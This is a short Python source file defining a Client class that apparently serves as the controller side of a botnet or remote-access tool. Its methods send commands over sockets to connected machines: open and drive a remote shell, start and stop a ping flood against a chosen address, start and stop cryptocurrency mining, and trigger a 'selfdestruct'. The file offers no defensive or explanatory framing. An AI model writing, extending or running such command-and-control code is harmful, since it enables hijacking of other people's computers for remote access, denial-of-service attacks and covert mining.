import time, socket

class Client:

    def __init__(self, conn, addr, server):
        self.conn = conn
        self.client_addr = addr
        self.server = server
        
        
    def request_info(self):
        command = 'cliget'
        self.conn.send(command.encode('utf-8'))
        self.conn.recv(1024)


    def start_shell(self, shelladdr):
        if self.client_addr == shelladdr:
        #if desired addr = client addr
            command = 'shell'
            self.conn.send(command.encode('utf-8'))
            return True

        else:
            #if desired addr != client addr
            return False

    def send_shell_command(self, command):
        command = command
        self.conn.send(command.encode('utf-8'))
        return True
    
    def recieve_shell_response(self):
        recieved = self.conn.recv(1024).decode('utf-8')
        return recieved
    
    def stop_shell(self):
        command = 'stop'
        self.conn.send(command.encode('utf-8'))
            
                       
    def start_ping(self, addr, bytecount):
        command = f'ping {addr} with {bytecount} bytes'
        self.conn.send(command.encode('utf-8'))
        time.sleep(0.5)
        self.conn.recv(1024)

    def stop_ping(self):
        command='stop ping'
        self.conn.send(command.encode('utf-8'))
        time.sleep(0.5)
        self.conn.recv(1024)

    def start_mine(self):
        command = 'startmine'
        self.conn.send(command.encode('utf-8'))
        self.conn.recv(1024)

    def stop_mine(self):
        command = 'stopmine'
        self.conn.send(command.encode('utf-8'))
        self.conn.recv(1024)
        
    def destroy(self):
        command = 'selfdestruct'
        self.conn.send(command.encode('utf-8'))
        self.conn.recv(1024)

    
